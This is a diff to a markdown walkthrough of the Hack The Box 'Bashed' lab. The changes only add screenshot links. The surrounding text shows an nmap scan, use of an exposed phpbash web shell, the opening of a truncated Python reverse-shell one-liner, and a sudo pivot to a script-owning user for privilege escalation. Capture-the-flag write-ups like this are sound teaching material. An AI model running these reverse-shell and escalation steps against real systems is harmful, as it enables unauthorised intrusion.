@@ -27,6 +27,8 @@ provides the path to root.
 nmap -sC -sV -p- -T4 10.129.2.32
 ```
 
+![nmap service scan](./assets/bashed/01-nmap.png)
+
 Only HTTP was open. The site itself was minimal, so directory brute-forcing
 was the immediate next step:
 
@@ -42,7 +44,11 @@ The scan turned up **`phpbash`**, a minimal PHP web shell, already deployed
 and reachable directly. This is the kind of finding that looks almost too
 easy — but leftover debugging/admin tooling exposed on a production-style web
 root is a very real class of real-world vulnerability, not just a lab
-contrivance. Browsing to it gave immediate command execution as `www-data`
+contrivance.
+
+![phpbash webshell giving command execution](./assets/bashed/02-phpbash-webshell.png)
+
+Browsing to it gave immediate command execution as `www-data`
 and the user flag.
 
 ---
@@ -63,6 +69,8 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```bash
 sudo -u scriptmanager /bin/bash
 ```
+
+![listing the /scripts directory](./assets/bashed/03-scripts-dir.png)
 
 As `scriptmanager`, a `/scripts` directory held a Python file, `test.py`,
 owned by `scriptmanager`, alongside a `test.txt` owned by `root` — a strong
